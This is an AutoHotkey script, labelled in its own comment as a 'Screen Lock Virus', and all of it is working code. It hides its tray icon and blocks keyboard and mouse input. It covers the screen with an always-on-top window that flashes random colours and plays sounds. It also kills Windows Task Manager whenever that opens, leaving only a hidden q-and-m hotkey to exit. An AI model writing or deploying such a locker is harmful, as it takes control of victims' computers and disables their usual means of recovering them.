/*
  Screen Lock Virus

  Description:-
	Locks The Computer Screen and randomly changes colors.
*/

#NoEnv
#SingleInstance Force
#Persistent
#NoTrayIcon

SetBatchLines -1 ;For Speed

; Blocks almost all kind of input - Keyboard & Mouse
BlockInput, On

;Gui Variables
Width	:=	A_ScreenWidth  + 20
Height	:=	A_ScreenHeight + 20

X	:=	(A_ScreenWidth  / 2) - 280
Y	:=	(A_ScreenHeight / 2) - 75

;Create a Gui
Gui -SysMenu +AlwaysOnTop +LastFound
Gui Font, s50
Gui Add, Text, c000000 x%X% y%Y%, I <3 Autohotkey...
Gui Show, w%Width% h%Height%, Lock3d

WinSet, Transparent, 175, Lock3d

SetTimer, Check, 250
SetTimer, Color, 500

Return	 ;End of Auto Execute Section

Color:
	Random, Rand, -99999, 9999999
	Gui, Color, %Rand%
	Soundplay, *-1
Return

; A way of 'taking over' task manager
Check:
	if WinExist("Windows Task Manager")
	{
		WinKill, ahk_class #32770
		WinSet AlwaysOnTop, On, Lock3d
	}
Return

q & m::
Exitapp
